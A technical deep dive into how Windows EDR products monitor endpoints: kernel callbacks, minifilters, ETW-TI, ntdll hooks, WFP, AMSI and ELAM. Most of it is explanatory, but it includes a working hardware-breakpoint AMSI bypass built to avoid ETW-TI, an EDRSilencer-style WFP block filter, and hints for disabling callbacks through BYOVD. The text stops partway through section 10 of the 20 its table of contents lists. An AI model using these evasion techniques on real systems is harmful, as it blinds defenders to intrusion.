# EDR Internals: A Complete Technical Deep Dive
### How Modern Endpoint Detection and Response Systems See, Think, and Act

---

> *"The EDR is not a product. It is a philosophy instantiated in kernel memory."*  
> — Paraphrased from multiple red team post-mortems

---

## Table of Contents

1. [What an EDR Actually Is](#1-what-an-edr-actually-is)
2. [The Three Detection Bubbles](#2-the-three-detection-bubbles)
3. [EDR Architecture: Component Map](#3-edr-architecture-component-map)
4. [Kernel Callback Infrastructure](#4-kernel-callback-infrastructure)
5. [File System Minifilter Drivers](#5-file-system-minifilter-drivers)
6. [Event Tracing for Windows (ETW)](#6-event-tracing-for-windows-etw)
7. [User-Mode Hooks and DLL Injection](#7-user-mode-hooks-and-dll-injection)
8. [Network Monitoring via WFP](#8-network-monitoring-via-wfp)
9. [AMSI: The Scripting Safety Net](#9-amsi-the-scripting-safety-net)
10. [AM-PPL, ELAM, and Process Protection](#10-am-ppl-elam-and-process-protection)
11. [PatchGuard and Kernel Integrity Constraints](#11-patchguard-and-kernel-integrity-constraints)
12. [Memory Analysis and VAD Scanning](#12-memory-analysis-and-vad-scanning)
13. [Call Stack Analysis and Validation](#13-call-stack-analysis-and-validation)
14. [Real-World EDR Implementations](#14-real-world-edr-implementations)
15. [Evasion Techniques and EDR Counter-Measures](#15-evasion-techniques-and-edr-counter-measures)
16. [BYOVD: The Nuclear Option](#16-byovd-the-nuclear-option)
17. [HVCI and VBS: The New Frontier](#17-hvci-and-vbs-the-new-frontier)
18. [Hardware-Level Detection: Intel TDT](#18-hardware-level-detection-intel-tdt)
19. [The Detection Arms Race: A Timeline](#19-the-detection-arms-race-a-timeline)
20. [Threat Modeling the EDR Itself](#20-threat-modeling-the-edr-itself)

---

## 1. What an EDR Actually Is

An Endpoint Detection and Response system is fundamentally a **kernel-resident observation engine** with a cloud-connected behavioral analysis backend. Unlike traditional AV products that pattern-match file signatures, an EDR's primary job is to watch *what code does*, not *what code looks like*.

The mental model:

```
┌─────────────────────────────────────────────────────────────────┐
│                        EDR Architecture                         │
│                                                                 │
│  ┌─────────────────┐     ┌─────────────────┐                   │
│  │   Kernel Layer  │     │   User Layer     │                   │
│  │                 │     │                 │                   │
│  │  ┌───────────┐  │     │  ┌───────────┐  │                   │
│  │  │  Callbacks│  │     │  │  DLL Hook │  │                   │
│  │  │  (Ps/Ob/  │  │     │  │  (ntdll)  │  │                   │
│  │  │   Cm/ETW) │  │     │  └─────┬─────┘  │                   │
│  │  └─────┬─────┘  │     │        │        │                   │
│  │        │        │     │  ┌─────▼──────┐  │                  │
│  │  ┌─────▼──────┐ │     │  │  AMSI      │  │                  │
│  │  │  Minifilter│ │     │  └─────┬──────┘  │                  │
│  │  │  (fltmgr)  │ │     └────────│─────────┘                  │
│  │  └─────┬──────┘ │              │                            │
│  │        │        │     ┌────────▼──────────┐                 │
│  │  ┌─────▼──────┐ │     │   Sensor Service  │                 │
│  │  │   WFP      │ ├────►│   (Correlation +  │                 │
│  │  │  (Network) │ │     │    Cloud Upload)  │                 │
│  │  └────────────┘ │     └────────┬──────────┘                 │
│  └─────────────────┘              │                            │
│                                   ▼                            │
│                        ┌──────────────────┐                    │
│                        │  Cloud Backend   │                    │
│                        │  (ML / Behavior  │                    │
│                        │   Analysis)      │                    │
│                        └──────────────────┘                    │
└─────────────────────────────────────────────────────────────────┘
```

The key insight: **an EDR wins by having more observation points than an attacker has evasion techniques**. Every layer described in this document is another set of eyes.

---

## 2. The Three Detection Bubbles

The blog post at `blog.deeb.ch/posts/how-edr-works/` introduces the concept of **"Bubbles of Bane"** — three detection layers that an EDR operates within. This is an elegant conceptual framework:

### Bubble 1: File Signature Scanning (Pre-Execution)
The oldest and most brittle layer. Before a file executes, the EDR's AV engine scans it against:
- Hash databases (MD5/SHA256/SHA1 of known-bad files)
- YARA rules (pattern matching across bytes)
- Fuzzy hashing (SSDEEP, TLSH) for variant detection
- Static PE analysis (import table, section entropy, certificate chain)

**Weakness**: Trivially defeated by any mutation — packing, encryption, encoding. This is why EDRs evolved.

### Bubble 2: Memory Scanning (Runtime Detection)
After code executes but before it completes harm:
- Periodic scanning of process memory for shellcode signatures
- Checking VAD (Virtual Address Descriptor) tree for anomalous regions
- Verifying in-memory image integrity against on-disk baseline
- Detecting DLL hollowing via PEB loader list vs. VAD discrepancy

**The key equation**: `on_disk_bytes ≠ in_memory_bytes → modification detected`

### Bubble 3: Behavioral Telemetry (Event-Driven Detection)
The modern core of every serious EDR. Monitors OS events in real-time:
- Process/thread/image-load notifications
- File I/O operations
- Registry modifications
- Network connections
- Memory allocation and protection changes
- API call sequences (behavioral chains)

**This is the hardest layer to defeat** because it monitors the *consequences* of malicious code, not the code itself.

### How the Bubbles Interact

```
Pre-Exec           Runtime              Behavioral
   │                  │                    │
   ▼                  ▼                    ▼
[File Hash] → [Memory Scan] → [API Call] → [Thread Create]
   │                  │                    │
   └──────────────────┴────────────────────┘
                       │
                  [Correlation]
                       │
                  [Alert / Block]
```

No single bubble is sufficient. An attacker who defeats signature scanning still faces memory and behavioral detection. This layered defense is why modern EDR products are fundamentally harder to bypass than 2015-era AV.

---

## 3. EDR Architecture: Component Map

A production EDR deploys the following components:

| Component | Layer | Purpose | Key APIs |
|-----------|-------|---------|----------|
| Kernel callback driver | Kernel | Process/thread/image/registry events | `PsSetCreateProcessNotifyRoutineEx`, `ObRegisterCallbacks`, `CmRegisterCallback` |
| File system minifilter | Kernel | File I/O interception and blocking | `FltRegisterFilter`, `FltCreateCommunicationPort` |
| WFP callout driver | Kernel | Network traffic inspection | `FwpsCalloutRegister`, `FwpmFilterAdd0` |
| ETW-TI subscriber | Kernel (PPL) | Deep memory/API telemetry | `EtwTiLog*` functions, `Microsoft-Windows-Threat-Intelligence` |
| ELAM driver | Pre-boot | Boot driver classification | `ELAM_CALLBACK_REGISTRY_ENTRY` |
| User-mode hook DLL | User | NTAPI call interception | Inline hooks in `ntdll.dll` |
| AMSI provider | User | Script/macro scanning | `AmsiScanBuffer`, `AmsiScanString` |
| Sensor service | User | Event correlation, cloud upload | Named pipe / IOCTL to kernel driver |

### The Data Pipeline

```
Kernel Event (e.g. NtAllocateVirtualMemory)
         │
         ├──► ETW-TI Provider emits THREATINT_ALLOCVM event
         │
         ├──► Process callback fires (if new process)
         │
         └──► Minifilter pre-op (if file involved)
                        │
                        ▼
               EDR Kernel Driver collects
                        │
                        ▼
               IOCTL / Named Pipe to service
                        │
                        ▼
               Sensor Service (correlation, enrichment)
                     [adds: cmdline, PPID, image path,
                      memory region type, callstack]
                        │
                        ▼
               Cloud Upload (encrypted, Bond-serialized)
                        │
                        ▼
               ML Backend (behavioral graph analysis)
                        │
                  [Alert / Block / Investigate]
```

---

## 4. Kernel Callback Infrastructure

This is the **beating heart of every modern x64 EDR**. PatchGuard eliminates SSDT hooking, so all legitimate kernel-mode EDR monitoring uses documented callback registration APIs. Here is the complete catalog:

---

### 4.1 Process Notification Callbacks

**Registration API:**
```c
// Requires driver to be compiled with /integritycheck linker flag
NTSTATUS PsSetCreateProcessNotifyRoutineEx(
    PCREATE_PROCESS_NOTIFY_ROUTINE_EX NotifyRoutine,
    BOOLEAN Remove
);

// W10 build 14980+ variant with additional flags
NTSTATUS PsSetCreateProcessNotifyRoutineEx2(
    PSCREATEPROCESSNOTIFYTYPE NotifyType,
    PVOID NotifyInformation,
    BOOLEAN Remove
);
```

**Callback signature:**
```c
VOID ProcessNotifyRoutine(
    PEPROCESS Process,
    HANDLE ProcessId,
    PPS_CREATE_NOTIFY_INFO CreateInfo   // NULL on termination
);

typedef struct _PS_CREATE_NOTIFY_INFO {
    SIZE_T Size;
    union {
        ULONG Flags;
        struct {
            ULONG FileOpenNameAvailable : 1;
            ULONG IsSubsystemProcess    : 1;
            ULONG Reserved              : 30;
        };
    };
    HANDLE ParentProcessId;    // REAL parent — PPID spoofing does not fool this
    CLIENT_ID CreatingThreadId;
    struct _FILE_OBJECT *FileObject;
    PCUNICODE_STRING ImageFileName;
    PCUNICODE_STRING CommandLine;
    NTSTATUS CreationStatus;   // Mutable! Set to STATUS_ACCESS_DENIED to block
} PS_CREATE_NOTIFY_INFO;
```

**What EDRs extract from this:**
- True parent PID (immune to user-mode PPID spoofing via `UpdateProcThreadAttribute`)
- Full command line (unredacted, from kernel)
- Image path (before any user-mode manipulation)
- Ability to **block process creation** by writing to `CreationStatus`

**Internal storage (for BYOVD removal):**
Callbacks are stored in `PspCreateProcessNotifyRoutine`, a global array in ntoskrnl of up to 64 entries × 8 bytes = 512 bytes. Each entry is an `EX_CALLBACK_ROUTINE_BLOCK` pointer with the low 3 bits used as flags. To find this array at runtime:

```c
// Pattern: scan for LEA instruction referencing the array
// near exported PsSetCreateProcessNotifyRoutine
// then walk array, masking each entry: ptr & ~0xF → EX_CALLBACK_ROUTINE_BLOCK
// The actual callback is at EX_CALLBACK_ROUTINE_BLOCK.Function
```

---

### 4.2 Thread Notification Callbacks

```c
NTSTATUS PsSetCreateThreadNotifyRoutine(
    PCREATE_THREAD_NOTIFY_ROUTINE NotifyRoutine
);

// Fires for EVERY thread creation, including cross-process (remote threads)
// at kernel level — before user-mode code runs
VOID ThreadNotifyRoutine(
    HANDLE ProcessId,
    HANDLE ThreadId,
    BOOLEAN Create     // TRUE = creation, FALSE = termination
);
```

**Detection value:** Remote thread injection (classic `CreateRemoteThread` / `NtCreateThreadEx`) fires this callback with `ProcessId ≠ calling process`. EDR correlates this with preceding cross-process `OpenProcess` handle (from `ObRegisterCallbacks`) to identify injection source.

---

### 4.3 Image Load Notification Callbacks

```c
NTSTATUS PsSetLoadImageNotifyRoutine(
    PLOAD_IMAGE_NOTIFY_ROUTINE NotifyRoutine
);

VOID ImageNotifyRoutine(
    PUNICODE_STRING FullImageName,
    HANDLE ProcessId,
    PIMAGE_INFO ImageInfo
);

typedef struct _IMAGE_INFO {
    union {
        ULONG Properties;
        struct {
            ULONG ImageAddressingMode  : 8;
            ULONG SystemModeImage      : 1;  // kernel driver load
            ULONG ImageMappedToAllPids : 1;
            ULONG ExtendedInfoPresent  : 1;
            ULONG MachineTypeMismatch  : 1;
            ULONG ImageSignatureLevel  : 4;
            ULONG ImageSignatureType   : 3;
            ULONG ImagePartialMap      : 1;
            ULONG Reserved             : 12;
        };
    };
    PVOID ImageBase;
    ULONG ImageSelector;
    SIZE_T ImageSize;
    ULONG ImageSectionNumber;
} IMAGE_INFO;
```

**Note**: No unload notification API exists. EDRs must infer DLL unloads from `FreeLibrary` hooks or memory scanning.

**Reflective DLL detection**: Reflective DLLs (`ReflectiveLoader`) map themselves manually using `NtAllocateVirtualMemory` + `NtProtectVirtualMemory` without going through the normal section-mapping path. This fires ETW-TI events but **does not** trigger `PsSetLoadImageNotifyRoutine`. The result: the DLL appears in the VAD tree as a `MEM_PRIVATE` executable region with no backing file — a high-confidence shellcode indicator.

---

### 4.4 Object Callbacks: Handle Interception

This is how EDRs protect LSASS and high-value processes from credential dumping tools like `mimikatz`.

```c
OB_CALLBACK_REGISTRATION CallbackRegistration = {
    .Version = OB_FLT_REGISTRATION_VERSION,
    .OperationRegistrationCount = 1,
    .Altitude = L"321000",
    .RegistrationContext = NULL,
    .OperationRegistration = &OperationRegistration
};

OB_OPERATION_REGISTRATION OperationRegistration = {
    .ObjectType = PsProcessType,
    .Operations = OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE,
    .PreOperation = PreOperationCallback,
    .PostOperation = NULL
};

// Pre-callback: called BEFORE access check completes
OB_PREOP_CALLBACK_STATUS PreOperationCallback(
    PVOID RegistrationContext,
    POB_PRE_OPERATION_INFORMATION OperationInformation
) {
    // Strip dangerous access rights from any handle to lsass.exe
    if (IsTargetLsass(OperationInformation->Object)) {
        OperationInformation->Parameters->CreateHandleInformation
            .DesiredAccess &= ~(PROCESS_VM_READ | PROCESS_VM_WRITE |
                                PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE);
    }
    return OB_PREOP_SUCCESS;
}
```

**Internals:** Registered callbacks are stored in the `CallbackList` field of the `_OBJECT_TYPE` kernel structure. For process objects: `PsProcessType->CallbackList`. Each entry is an `OB_CALLBACK_ENTRY` with `Enabled` flag — BYOVD tools set this to `0` to disable handle protection.

**Limitation**: Pre-callbacks can *reduce* but not completely *deny* access — the minimum access `ObOpenObjectByPointer` enforces is `PROCESS_QUERY_LIMITED_INFORMATION`. But this prevents `ReadProcessMemory` on LSASS.

---

### 4.5 Registry Callbacks

```c
NTSTATUS CmRegisterCallbackEx(
    PEX_CALLBACK_FUNCTION Function,
    PCUNICODE_STRING Altitude,
    PVOID Driver,
    PVOID Context,
    PLARGE_INTEGER Cookie,
    PVOID Reserved
);

// Fires pre- and post-operation for ALL registry operations
// Pre-op can:
//   - Modify arguments (e.g., redirect key paths)
//   - Short-circuit by returning STATUS_CALLBACK_BYPASS
//   - Block by returning error status
```

**EDR use cases:**
- Block deletion of EDR's own registry persistence keys
- Detect malware persistence (Run keys, service registration)
- Detect Lazarus-style ETW disabling via registry under `HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\`

---

## 5. File System Minifilter Drivers

The Filter Manager (`fltmgr.sys`) is a kernel component that sits between the I/O Manager and file system drivers. It allows multiple minifilter drivers to register and intercept IRP (I/O Request Packet) flow.

### Altitude System

Every minifilter registers at a specific **altitude** — a string-represented decimal number. The Filter Manager dispatches operations in **descending altitude order** on the way down (pre-op) and **ascending order** on the way up (post-op).

```
User-mode Request (e.g., CreateFile)
         │
         ▼
    I/O Manager
         │
         ▼
┌────────────────────────────────┐
│        Filter Manager          │
│                                │
│  Altitude 389000 (EDR Type A)  │ ← pre-op first
│  Altitude 321000 (AV Engine)   │
│  Altitude 320500 (EDR Type B)  │
│         ↓ file operation       │
│  Altitude 320500 (EDR Type B)  │ ← post-op first (ascending)
│  Altitude 321000 (AV Engine)   │
│  Altitude 389000 (EDR Type A)  │
└────────────────────────────────┘
         │
         ▼
    NTFS / FAT32 / ReFS
```

**Altitude ranges for security products:**
- `320000–329999`: FSFilter Anti-Virus
- `260000–269999`: FSFilter Content Screener
- `240000–249999`: FSFilter Quota Management

### Registration and Operation

```c
const FLT_OPERATION_REGISTRATION Callbacks[] = {
    { IRP_MJ_CREATE,          0, PreCreate,   PostCreate   },
    { IRP_MJ_READ,            0, PreRead,     PostRead     },
    { IRP_MJ_WRITE,           0, PreWrite,    PostWrite    },
    { IRP_MJ_SET_INFORMATION, 0, PreSetInfo,  NULL         },
    { IRP_MJ_CLEANUP,         0, PreCleanup,  NULL         },
    { IRP_MJ_OPERATION_END }
};

const FLT_REGISTRATION FilterRegistration = {
    sizeof(FLT_REGISTRATION),
    FLT_REGISTRATION_VERSION,
    0,
    ContextRegistration,
    Callbacks,
    UnloadCallback,
    InstanceSetupCallback,
    InstanceQueryTeardownCallback,
    InstanceTeardownStartCallback,
    InstanceTeardownCompleteCallback,
};

FltRegisterFilter(DriverObject, &FilterRegistration, &gFilterHandle);
FltStartFiltering(gFilterHandle);
```

**Pre-op return values:**
- `FLT_PREOP_SUCCESS_WITH_CALLBACK`: Continue, call post-op
- `FLT_PREOP_SUCCESS_NO_CALLBACK`: Continue, skip post-op
- `FLT_PREOP_COMPLETE`: Short-circuit (block), do not pass to lower filters
- `FLT_PREOP_PENDING`: Queue for async processing (scanning large files)

### Communication Ports: Kernel-to-User Messaging

```c
// Kernel side: create server port
FltCreateCommunicationPort(
    gFilterHandle,
    &gServerPort,
    &objectAttributes,
    NULL,
    ConnectNotifyCallback,     // user-mode client connected
    DisconnectNotifyCallback,  // client disconnected
    MessageNotifyCallback,     // message received from user-mode
    1                          // max clients
);

// User-mode side: connect
FilterConnectCommunicationPort(
    L"\\EDRPort",
    0, NULL, 0,
    NULL,
    &hPort
);
```

### WdFilter.sys Deep Internals

Microsoft Defender's minifilter (`WdFilter.sys`) is the most well-studied production EDR minifilter. Key structures:

```c
// MpData: Global driver state (0xCC0 bytes, pool tag 'MPfd')
typedef struct _MP_DATA {
    // at +0x00: driver object
    // at +0x08: device object
    // at +0x10: filter handle
    // at +0x18: communication ports array [4]
    //   [0] MicrosoftMalwareProtectionControlPort
    //   [1] MicrosoftMalwareProtectionPort
    //   [2] MicrosoftMalwareProtectionVeryLowIoPort
    //   [3] MicrosoftMalwareProtectionRemoteIoPort
    // at +0x40: process callback registration
    // ... (partially reversed)
} MP_DATA;

// ProcessCtx: Per-process context (0xC0 bytes, pool tag 'MPpX')
// Allocated on PsSetCreateProcessNotifyRoutineEx2 callback
// Tracks: process flags, scan state, cached scan results
typedef struct _PROCESS_CTX {
    EPROCESS *Process;
    HANDLE   ProcessId;
    ULONG    Flags;        // IsProtected, IsSystem, IsMpService, etc.
    // scan cache entries
    // ... 
} PROCESS_CTX;
```

WdFilter registers all of the following:
1. `PsSetCreateProcessNotifyRoutineEx2` (W10 14980+) / `Ex` / legacy fallback
2. `PsSetCreateThreadNotifyRoutine`
3. `PsSetLoadImageNotifyRoutine`
4. `ObRegisterCallbacks` for Process + Desktop object types
5. `CmRegisterCallbackEx` for registry events
6. `PoRegisterPowerSettingCallback` for power state changes
7. 4× `FltCreateCommunicationPort` for user-mode communication

---

## 6. Event Tracing for Windows (ETW)

ETW is a high-performance, kernel-resident event logging infrastructure. For EDRs, it provides telemetry that **cannot be defeated by user-mode code patching**.

### ETW Provider Types

| Type | Metadata Location | Introduced |
|------|------------------|-----------|
| Legacy MOF | WMI repository | NT 4.0 |
| Manifest-based | Binary resources + registry | Vista |
| WPP | PDB files (private) | XP |
| TraceLogging | Embedded in binary | W10 |

### The Crown Jewel: Microsoft-Windows-Threat-Intelligence

**GUID**: `{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}`

This provider emits from **kernel context** after operations complete. It cannot be silenced by patching user-mode `ntdll!EtwEventWrite`. Consumer processes must be `PsProtectedSignerAntimalware-Light` (AM-PPL) — enforced in `EtwpCheckNotificationAccess`.

**Kernel emission functions:**

```
EtwTiLogAllocExecVm        → fires on NtAllocateVirtualMemory with executable protection
EtwTiLogReadWriteVm        → fires on MiReadWriteVirtualMemory (cross-process)
EtwTiLogSetContextThread   → fires on NtSetContextThread
EtwTiLogInsertQueueUserApc → fires on NtQueueApcThread
EtwTiLogProtectVm          → fires on NtProtectVirtualMemory
EtwTiLogMapViewOfSection   → fires on NtMapViewOfSection
EtwTiLogResumeThread       → fires on NtResumeThread
EtwTiLogSuspendThread      → fires on NtSuspendThread
```

**Complete ETW-TI event taxonomy:**

| Event Name | Trigger | Detection Use |
|------------|---------|--------------|
| `THREATINT_ALLOCVM_LOCAL` | `NtAllocateVirtualMemory` in own process | Shellcode staging |
| `THREATINT_ALLOCVM_REMOTE` | `NtAllocateVirtualMemory` cross-process | Process injection |
| `THREATINT_WRITEVM_LOCAL` | `NtWriteVirtualMemory` in own process | Self-modification |
| `THREATINT_WRITEVM_REMOTE` | `NtWriteVirtualMemory` cross-process | Process injection payload write |
| `THREATINT_PROTECTVM_LOCAL` | `NtProtectVirtualMemory` in own process | RWX transition (shellcode) |
| `THREATINT_PROTECTVM_REMOTE` | `NtProtectVirtualMemory` cross-process | Injection setup |
| `THREATINT_MAPVIEW_LOCAL` | `NtMapViewOfSection` in own process | Section injection, PE loading |
| `THREATINT_MAPVIEW_REMOTE` | `NtMapViewOfSection` cross-process | Map injection |
| `THREATINT_QUEUEUSERAPC_REMOTE` | `NtQueueApcThread` cross-process | APC injection |
| `THREATINT_SETTHREADCONTEXT_REMOTE` | `NtSetContextThread` cross-process | Thread hijacking |
| `THREATINT_RESUME_THREAD` | `NtResumeThread` | Post-injection activation |
| `THREATINT_SUSPEND_THREAD` | `NtSuspendThread` | Evasion during injection |

**Critical EPROCESS flags for ETW-TI remote VM events:**

```c
// EPROCESS at offset 0x1F0 (version-dependent):
// Bit 24: EnableReadVmLogging  
// Bit 25: EnableWriteVmLogging
// Without these set, THREATINT_READVM_REMOTE / WRITEVM_REMOTE do NOT fire!

// Enable via:
PROCESS_READWRITEVM_LOGGING_INFORMATION LogInfo = {
    .Flags = 0x3  // bits 0 and 1 = enable read + write logging
};
ZwSetInformationProcess(
    TargetHandle,
    (PROCESSINFOCLASS)87,  // ProcessReadWriteVmLogging
    &LogInfo,
    sizeof(LogInfo)
);
```

### Microsoft Defender for Endpoint ETW Subscriptions

MDE subscribes to **~65 ETW providers** (identified by researchers at FalconForce). Partial list of critical providers:

```
Microsoft-Windows-Threat-Intelligence
Microsoft-Windows-Kernel-Audit-API-Calls
Microsoft-Windows-Security-Auditing
Microsoft-Windows-Kernel-Process
Microsoft-Windows-Kernel-File
Microsoft-Windows-WMI-Activity
Microsoft-Windows-PowerShell
Microsoft-Windows-DotNETRuntime
Microsoft-Windows-RPC
Microsoft-Antimalware-Engine
Microsoft-Windows-DNS-Client
Microsoft-Windows-NTLM
```

Events are serialized using **Microsoft Bond** (binary serialization framework), base64-encoded, then uploaded to the MDE cloud endpoint.

---

## 7. User-Mode Hooks and DLL Injection

While kernel-space monitoring provides the strongest guarantees, EDRs also inject into user space for additional visibility and context.

### DLL Injection Mechanism

When `PsSetCreateProcessNotifyRoutineEx` fires on new process creation, the EDR's kernel driver can:

1. Queue an APC to the main thread pointing to `LoadLibrary`
2. Map its monitoring DLL via `ZwMapViewOfSection` into the new process
3. Use its `PsSetLoadImageNotifyRoutine` callback to track when process initialization completes

The injected DLL installs **inline hooks** in the newly loaded `ntdll.dll`.

### Inline Hooking Mechanics

```
Before Hooking:
  ntdll!NtAllocateVirtualMemory:
    4C 8B D1          mov r10, rcx
    B8 18 00 00 00    mov eax, 0x18   ; SSN
    0F 05             syscall
    C3                ret

After EDR Hooks:
  ntdll!NtAllocateVirtualMemory:
    E9 XX XX XX XX    jmp EDR_Hook_NtAllocateVirtualMemory
    00 00             (overwritten)
    0F 05             syscall         ← unreachable normally
    C3                ret

Trampoline (EDR allocates):
    4C 8B D1          mov r10, rcx   ; original bytes
    B8 18 00 00 00    mov eax, 0x18  ; original bytes
    E9 YY YY YY YY    jmp ntdll+0x7 ; back past hook

EDR Hook Function:
    → capture arguments
    → check if suspicious (cross-process? executable page?)
    → call trampoline (for legitimate calls)
    → emit telemetry event
    → return result
```

For 64-bit targets, the jump requires 14 bytes if the destination is more than 2GB away:

```asm
; 14-byte far jump
48 B8 XX XX XX XX XX XX XX XX   mov rax, <absolute_address>
FF E0                             jmp rax
```

### What EDR Hooks Observe That Kernel Callbacks Miss

| Information | Kernel Callback | User-Mode Hook |
|-------------|----------------|---------------|
| Return address chain (callstack) | ✓ (via ETW) | ✓ (directly) |
| Argument values | Partial (limited by callback type) | Full |
| Heap allocation patterns | ✗ | ✓ |
| String arguments (e.g., command line in `ShellExecute`) | ✗ | ✓ |
| COM object method calls | ✗ | ✓ |
| WinINet / socket content | ✗ | ✓ |

### Hook Self-Integrity

To detect removal of its own hooks, the EDR:
1. Periodically reads its hook targets and compares against installed bytes
2. Uses its own `NtReadVirtualMemory` hook to detect if someone read the hook region (potential recon)
3. Subscribes to ETW-TI `THREATINT_PROTECTVM_LOCAL` events targeting the hook pages

---

## 8. Network Monitoring via WFP

The **Windows Filtering Platform (WFP)** is a set of APIs and kernel services for network packet inspection, filtering, and modification. Modern EDRs use WFP for network telemetry far beyond what the old TDI/NDIS hooking era provided.

### WFP Architecture

```
Application (socket)
      │
      ▼
  ALE Layer (Application Layer Enforcement)
  ┌─────────────────────────────────────────┐
  │  FWPM_LAYER_ALE_AUTH_CONNECT_V4/V6     │ ← connection authorization
  │  FWPM_LAYER_ALE_AUTH_RECV_ACCEPT_V4/V6 │ ← accept authorization
  │  FWPM_LAYER_ALE_FLOW_ESTABLISHED_V4/V6 │ ← flow creation notification
  └─────────────────────────────────────────┘
      │
      ▼
  Transport Layer
  ┌──────────────────────────────┐
  │  FWPM_LAYER_STREAM_V4/V6   │ ← TCP stream data inspection
  │  FWPM_LAYER_DATAGRAM_DATA  │ ← UDP payload inspection
  └──────────────────────────────┘
      │
      ▼
  Network Layer
  ┌──────────────────────────────┐
  │  FWPM_LAYER_INBOUND_IPPACKET│ ← raw IP packet (no process context)
  │  FWPM_LAYER_OUTBOUND_IPPACKET│
  └──────────────────────────────┘
```

### Callout Driver Registration

```c
// Register callout function
FWPS_CALLOUT0 callout = {
    .calloutKey = MY_CALLOUT_GUID,
    .flags = 0,
    .classifyFn = ClassifyFunction,    // called for each matched packet
    .notifyFn = NotifyFunction,        // filter add/delete notification
    .flowDeleteFn = FlowDeleteFunction // flow teardown
};
FwpsCalloutRegister0(deviceObject, &callout, &calloutId);

// Add filter that routes traffic to callout
FWPM_FILTER0 filter = {
    .layerKey = FWPM_LAYER_ALE_FLOW_ESTABLISHED_V4,
    .action = { .type = FWP_ACTION_CALLOUT_INSPECTION },
    .subLayerKey = MY_SUBLAYER_GUID,
    .weight = { .type = FWP_UINT8, .uint8 = 15 },
    .numFilterConditions = 0   // match all
};
FwpmFilterAdd0(engineHandle, &filter, NULL, &filterId);
```

### WdNisDrv.sys: Windows Defender Network Inspection

`WdNisDrv.sys` (Windows Defender Network Inspection Service Driver) is the WFP callout driver for Defender/MDE:

- **Layers monitored**: `ALE_FLOW_ESTABLISHED_V4/V6`, `STREAM_V4/V6`, `DATAGRAM_DATA_V4/V6`
- **Per-flow context** (`FLOW_CONTEXT` structure): local/remote address, local/remote port, process PID, flow handle, filter flags
- **User-mode communication**: Cancel-safe IRP queues sending `FLOW_NOTIFICATION` (new connection) and `STREAM_DATA_NOTIFICATION` (payload) to `WdNisSvc`
- **Access control**: Device DACL restricts handle acquisition to `WdNisSvc` service account (SID: `NT SERVICE\WdNisSvc`)

**Internal callout location**: Callout entries are stored in a global array at `NETIO!gWfpGlobal + 0x198`. Each 0x50-byte entry contains `ClassifyFunction` at offset `0x10`.

### WFP-Based EDR Evasion (and Why It Fails)

Tools like **EDRSilencer** abuse WFP offensively:

```c
// Identify EDR process by name
// Create block filter targeting EDR's outbound connections
FWPM_FILTER0 blockFilter = {
    .layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V4,
    .action = { .type = FWP_ACTION_BLOCK },
    .weight = { .type = FWP_UINT8, .uint8 = 15 },
};
// Add condition: app ID matches EDR executable path
FwpmFilterAdd0(engineHandle, &blockFilter, NULL, &filterId);
```

**Why this is detectable:**
- Windows Security Audit Event **5447** fires on every WFP filter modification
- EDR can register a **permanent callout** (survives driver unload) at max weight `0xFFFFFFFFFFFFFFFF` with `FWP_ACTION_PERMIT` and `FWPM_FILTER_FLAG_CLEAR_ACTION_RIGHT` — this callout's permit decision cannot be overridden by user-added block filters
- WFP **sublayer weighting**: the EDR's sublayer weight determines priority; if EDR creates a sublayer with `weight = 0xFFFF`, its filters process first

---

## 9. AMSI: The Scripting Safety Net

The **Antimalware Scan Interface** (implemented in `amsi.dll`) provides a standardized API for script interpreters to submit content for scanning before execution.

### AMSI Integration Points

| Runtime | AMSI Integration |
|---------|-----------------|
| PowerShell 5.1+ | Before script block execution |
| Windows Script Host | Before VBScript/JScript execution |
| JavaScript/JScript | Via `IActiveScriptSite::OnScriptError` override |
| Office VBA | Before macro execution (Office 2016+) |
| WMI | Before WMI script execution |
| .NET | Via `System.Management.Automation` assembly |
| Custom apps | Via `AmsiScanBuffer()` / `AmsiScanString()` API |

### AMSI Flow

```
PowerShell receives script block
         │
         ▼
AmsiInitialize("PowerShell")  → creates AMSI context
         │
         ▼
AmsiOpenSession(context, &session)
         │
         ▼
AmsiScanBuffer(context, session, buffer, size, "filename", &result)
         │    ↑
         │    └── calls all registered AMSI providers
         │         including EDR's AmsiProvider.dll
         ▼
AMSI_RESULT_DETECTED → PowerShell throws exception
AMSI_RESULT_CLEAN    → script executes
```

### Patchless AMSI Bypass via Hardware Breakpoints

The classic `AmsiScanBuffer` byte-patch is detected by memory scanning. The stealthy modern approach uses hardware debug registers:

```c
// Step 1: Set hardware breakpoint (Dr0) on AmsiScanBuffer
CONTEXT ctx = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
GetThreadContext(GetCurrentThread(), &ctx);
ctx.Dr0 = (DWORD64)AmsiScanBuffer;
ctx.Dr7 = 0x1;  // enable Dr0 local breakpoint (execute, 1-byte)
// DON'T use SetThreadContext — it fires EtwTiLogSetContextThread!
// Use NtContinue to set context without ETW-TI detection:
NtContinue(&ctx, FALSE);

// Step 2: Install VEH to handle the breakpoint
LONG CALLBACK AmsiVeh(PEXCEPTION_POINTERS ep) {
    if (ep->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP &&
        ep->ExceptionRecord->ExceptionAddress == g_AmsiScanBuffer) {
        // Forge AMSI_RESULT_CLEAN in the output parameter
        AMSI_RESULT *pResult = *(AMSI_RESULT**)(ep->ContextRecord->Rsp + 0x28);
        if (pResult) *pResult = AMSI_RESULT_CLEAN;
        // Return from AmsiScanBuffer as if succeeded
        ep->ContextRecord->Rip = *(DWORD64*)ep->ContextRecord->Rsp; // ret addr
        ep->ContextRecord->Rsp += 8;
        ep->ContextRecord->Rax = S_OK;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}
AddVectoredExceptionHandler(1, AmsiVeh);
```

**Why this matters for EDR:** Using `NtContinue` to set hardware breakpoints instead of `SetThreadContext` avoids generating `EtwTiLogSetContextThread` events, making this technique significantly harder to detect from the ETW-TI perspective. Modern EDRs (Elastic, MDE) have added specific detection for this pattern.

---

## 10. AM-PPL, ELAM, and Process Protection

### Early Launch Antimalware (ELAM)

ELAM drivers load at boot time, **before any third-party code**, allowing them to evaluate boot drivers:

```
BIOS/UEFI → Windows Boot Manager → WinLoad.exe → NT Kernel
                                                       │
                                               [ELAM Driver loads]
                                                       │
                                               [Evaluates each boot driver]
                                                       │
